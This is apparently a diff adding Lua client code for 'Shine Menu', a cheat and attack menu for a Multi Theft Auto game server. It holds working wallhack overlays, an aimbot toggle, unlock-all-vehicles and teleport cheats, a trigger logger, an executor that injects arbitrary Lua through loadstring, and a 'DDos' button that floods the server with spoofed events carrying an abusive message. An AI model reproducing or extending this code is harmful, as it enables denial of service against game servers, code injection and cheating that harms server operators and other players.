+				setElementPosition(localPlayer,PosTrollX+RandomPosition,PosTrollY+RandomPosition,PosTrollZ)
+			end,150,0)
+		end
+		addNotification("Position Troll Has Been "..(isTimer(PositionTrollTimer) and "Enabled" or "Disabled").." Successfully.",{255,0,0})
+	elseif source == ShineMenu.button[24] then
+		for Index, Vehicles in ipairs(getElementsByType("vehicle")) do
+            setVehicleLocked(Vehicles,false)
+        end
+		addNotification("All Vehicles Has Been Unlocked Successfully.",{255,0,0})
+	elseif source == ShineMenu.button[25] then
+		if isPedInVehicle(localPlayer) and getPedOccupiedVehicleSeat(localPlayer) == 0 then
+            setElementHealth(getPedOccupiedVehicle(localPlayer),150)
+        else
+            addNotification("You Must Be Driver To Fire Vehicle.",{255,0,0})
+        end
+	elseif source == ShineMenu.button[26] then
+		if isPedInVehicle(localPlayer) and getPedOccupiedVehicleSeat(localPlayer) == 0 then
+			addVehicleUpgrade(getPedOccupiedVehicle(localPlayer),1010)
+			addNotification("Nitro Has Been Successfully Added.",{255,0,0})
+        else
+            addNotification("You Must Be Driver To Add Nitro For Vehicle.",{255,0,0})
+        end
+	elseif source == ShineMenu.button[28] then
+		outputChatBox("================================================",255,255,255,true)
+        local Data = getAllElementData(localPlayer)
+        for k, v in pairs(Data) do
+            outputChatBox("#FF0000[SHINE]:#FFFFFF "..k..": "..tostring(v),255,255,255,true)
+        end
+        outputChatBox("================================================",255,255,255,true)
+	elseif source == ShineMenu.button[27] then
+		isTriggerLoggerEnabled = not isTriggerLoggerEnabled
+		addNotification("Trigger Logger Has Been "..(isTriggerLoggerEnabled and "Enabled" or "Disabled").." Successfully.",{255,0,0})
+	elseif source == ExecuteScript then
+        loadstring(guiGetText(ExecutorMemo))()
+		addNotification("Lua Script Has Been Injected Successfully.",{255,0,0})
+	elseif source == Esp.Label[1] or source == Esp.Text[1] then
+		guiCheckBoxSetSelected(Esp.Tik[1],not guiCheckBoxGetSelected(Esp.Tik[1]))
+	elseif source == Esp.Label[2] or source == Esp.Text[2] then
+		guiCheckBoxSetSelected(Esp.Tik[2],not guiCheckBoxGetSelected(Esp.Tik[2]))
+		if isEventHandlerAdded("onClientRender",root,drawSkeleton) then
+            removeEventHandler("onClientRender",root,drawSkeleton)
+        else
+            addEventHandler("onClientRender",root,drawSkeleton)
+        end
+	elseif source == Esp.Label[3] or source == Esp.Text[3] then
+		guiCheckBoxSetSelected(Esp.Tik[3],not guiCheckBoxGetSelected(Esp.Tik[3]))
+		if isEventHandlerAdded("onClientRender",root,drawBox) then
+            removeEventHandler("onClientRender",root,drawBox)
+        else
+            addEventHandler("onClientRender",root,drawBox)
+        end
+	elseif source == Esp.Label[4] or source == Esp.Text[4] then
+		guiCheckBoxSetSelected(Esp.Tik[4],not guiCheckBoxGetSelected(Esp.Tik[4]))
+		if isEventHandlerAdded("onClientRender",root,drawLine) then
+            removeEventHandler("onClientRender",root,drawLine)
+        else
+            addEventHandler("onClientRender",root,drawLine)
+        end
+	elseif source == Esp.Label[5] or source == Esp.Text[5] then
+		guiCheckBoxSetSelected(Esp.Tik[5],not guiCheckBoxGetSelected(Esp.Tik[5]))
+		if isEventHandlerAdded("onClientRender",root,drawName) then
+            removeEventHandler("onClientRender",root,drawName)
+        else
+            addEventHandler("onClientRender",root,drawName)
+        end
+	elseif source == Esp.Label[6] or source == Esp.Text[6] then
+		guiCheckBoxSetSelected(Esp.Tik[6],not guiCheckBoxGetSelected(Esp.Tik[6]))
+		if isEventHandlerAdded("onClientRender",root,drawDistance) then
+            removeEventHandler("onClientRender",root,drawDistance)
+        else
+            addEventHandler("onClientRender",root,drawDistance)
+        end
+	elseif source == EspVehicle.Label[1] or source == EspVehicle.Text[1] then
+		guiCheckBoxSetSelected(EspVehicle.Tik[1],not guiCheckBoxGetSelected(EspVehicle.Tik[1]))
+		if isEventHandlerAdded("onClientRender",root,drawLineVehicle) then
+            removeEventHandler("onClientRender",root,drawLineVehicle)
+        else
+            addEventHandler("onClientRender",root,drawLineVehicle)
+        end
+	elseif source == EspVehicle.Label[2] or source == EspVehicle.Text[2] then
+		guiCheckBoxSetSelected(EspVehicle.Tik[2],not guiCheckBoxGetSelected(EspVehicle.Tik[2]))
+		if isEventHandlerAdded("onClientRender",root,drawNameVehicle) then
+            removeEventHandler("onClientRender",root,drawNameVehicle)
+        else
+            addEventHandler("onClientRender",root,drawNameVehicle)
+        end
+	elseif source == EspVehicle.Label[3] or source == EspVehicle.Text[3] then
+		guiCheckBoxSetSelected(EspVehicle.Tik[3],not guiCheckBoxGetSelected(EspVehicle.Tik[3]))
+		if isEventHandlerAdded("onClientRender",root,drawDistanceVehicle) then
+            removeEventHandler("onClientRender",root,drawDistanceVehicle)
+        else
+            addEventHandler("onClientRender",root,drawDistanceVehicle)
+        end
+	elseif source == ShineMenu.button[29] then
+		if tonumber(guiGetText(DDosValue)) and tonumber(guiGetText(DDosValue)) >= 1 then
+			addNotification(tonumber(guiGetText(DDosValue)).." Packets Sended Successfully.",{255,0,0})
+			for ShineDdos = 1, tonumber(guiGetText(DDosValue)) do
+				for Index, Player in pairs(getElementsByType("player")) do
+					local RandomNumber = math.random(1000,9999)
+					triggerServerEvent("SHINE MENU 1.3 Fucked Your Server! "..RandomNumber,Player)
+				end
+			end
+		else
+            addNotification("Please Put Valid Number In Field.",{255,0,0})
+		end
+	elseif source == ShineMenu.button[30] then
+		Position = Vector3(getElementPosition(localPlayer))
+		InteriorDimension = {getElementInterior(localPlayer),getElementDimension(localPlayer)}
+		addNotification("Position Has Been Saved Successfully.",{255,0,0})
+	elseif source == ShineMenu.button[31] then
+		if Position then
+			setElementPosition(localPlayer,Position)
+			setElementInterior(localPlayer,InteriorDimension[1])
+			setElementDimension(localPlayer,InteriorDimension[2])
+		    addNotification("Teleported.",{255,0,0})
+		else
+		    addNotification("Couldn't Find Position.",{255,0,0})
+		end
+	elseif source == ShineMenu.button[36] then
+		if tonumber(guiGetText(SkinID)) and tonumber(guiGetText(SkinID)) >= 0 then
+			if setElementModel(localPlayer,tonumber(guiGetText(SkinID))) then
+				addNotification("Your Skin Has Been Changed Successfully.",{255,0,0})
+			else
+                addNotification("Invalid Skin ID.",{255,0,0})
+			end
+		else
+            addNotification("Please Put Valid Number In Field.",{255,0,0})
+		end
+	elseif source == ShineMenu.button[37] then
+		setFPSLimit(0)
+		addNotification("FPS Limit Has Been Removed Successfully.",{255,0,0})
+	elseif source == ShineMenu.button[38] then
+		clearChatBox()
+		addNotification("Your Chat Box Has Been Cleared Successfully.",{255,0,0})
+	elseif source == ShineMenu.button[39] then
+		setWorldSpecialPropertyEnabled("randomfoliage",not isWorldSpecialPropertyEnabled("randomfoliage"))
+		setCloudsEnabled(isWorldSpecialPropertyEnabled("randomfoliage"))
+		setBirdsEnabled(isWorldSpecialPropertyEnabled("randomfoliage"))
+        addNotification("FPS Boost Has Been "..(isWorldSpecialPropertyEnabled("randomfoliage") and "Enabled" or "Disabled").." Successfully.",{255,0,0})
+	elseif source == ShineMenu.button[40] then
+		isTrashAimbotEnabled = not isTrashAimbotEnabled
+		addNotification("Trash Aimbot Has Been "..(isTrashAimbotEnabled and "Enabled" or "Disabled").." Successfully.",{255,0,0})
+	elseif source == Keybind then
+        if not InKeybindMode then
+            InKeybindMode = true
+            guiSetAlpha(Keybind,0.5)
+        end
+    else
+        if InKeybindMode then
+            InKeybindMode = false
+            guiSetAlpha(Keybind,1.0)
+        end
+    end
+end)
+
+Locations = {
+	[32] = {2494,-1666,14},
+	[33] = {1522,-1672,14},
+	[34] = {-1502,914,8},
+	[35] = {1693,1452,11}
+}
+
+for LocationsButton = 32,35 do
+	addEventHandler("onClientGUIClick",getRootElement(),function()
+		if source == ShineMenu.button[LocationsButton] then
+			setElementPosition(localPlayer,Locations[LocationsButton][1],Locations[LocationsButton][2],Locations[LocationsButton][3])
+			setElementInterior(localPlayer,0)
+			setElementDimension(localPlayer,0)
+			addNotification("Teleported.",{255,0,0})
+		end
+	end)
+end
